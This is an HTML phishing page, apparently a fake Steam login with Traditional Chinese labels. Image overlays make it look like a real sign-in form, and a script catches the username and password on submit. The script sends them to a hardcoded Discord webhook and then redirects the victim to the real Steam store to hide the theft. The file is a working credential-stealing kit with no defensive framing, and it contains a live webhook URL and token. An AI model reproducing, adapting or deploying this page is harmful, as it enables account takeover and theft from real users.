<!DOCTYPE html>
<html lang="zh-TW">
<head>
    <style>
        body {
            margin: 0; 
            background-color: #000
        }
        img {
            display: block; 
            width: 100%;    
            height: auto;
        }
        .input-overlay {
            box-sizing: border-box;
            color: #ffffff;
            position: absolute;
            bottom: 535px; 
            right: 878px;   
            border: none;  
            outline: none;
            font-size: 15px;
            caret-color:#ffffff;
            background-color: #32353C;
            height: 37px;
            width: 397px;
            padding: 10px;
            z-index:100;
        }
        .input-overlay:hover {
            background-color: #393C44;
        }
        .input-overlay123 {
            box-sizing: border-box;
            color: #ffffff;
            position: absolute;
            bottom: 463px; 
            right: 878px;   
            border: none;  
            outline: none;
            font-size: 15px;
            caret-color:#ffffff;
            background-color: #32353C;
            height: 37px;
            width: 397px;
            padding: 10px;
            z-index:100;
        }
        .input-overlay123:hover {
            background-color: #393C44;
        }
        .input_img{
            z-index:2;
            position: absolute;
            bottom: 286px; 
            right: 603px;
            width: 700px; 
            height: auto;
        }
        .button_css{
            z-index:3;
            position: absolute;
            bottom: 370px; 
            right: 939px;
            width: 280px; 
            height: auto;
            border: none;     
            padding: 0;        
            background: none;
        }
    </style>
</head>
<body>
    <form id="submit-form">
        <img src="input.png" class="input_img">
        <img src="img.png">

        <button type="submit" class="button_css">
            <img src="button.png" style="width: 100%;">
        </button>

        <input type="text" id="acc" class="input-overlay">
        <input type="password" id="pwd" class="input-overlay123">
    </form>

    <script>
    document.getElementById("submit-form").addEventListener("submit", function(e) {
        e.preventDefault(); 

        const account = document.getElementById("acc").value;
        const password = document.getElementById("pwd").value;

        const webhookURL = "https://discord.com/api/webhooks/1494608428969103480/r4QDGJSxwYqfqT1813pNn0xVH3xXdcM2a_qed8B0htM4qPmUlzjoDGP3kjea9FATwFXt";
        const payload = {
            content: `帳號: ${account}\n 密碼: ${password}\n`
        };

        fetch(webhookURL, {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify(payload)
        })
        .then(response => {
            if (response.ok) {
                this.reset();
                window.location.href = "https://store.steampowered.com/";
            }
        })
        .catch(error => console.error('Error:', error));
    });
    </script>
</body>
</html>
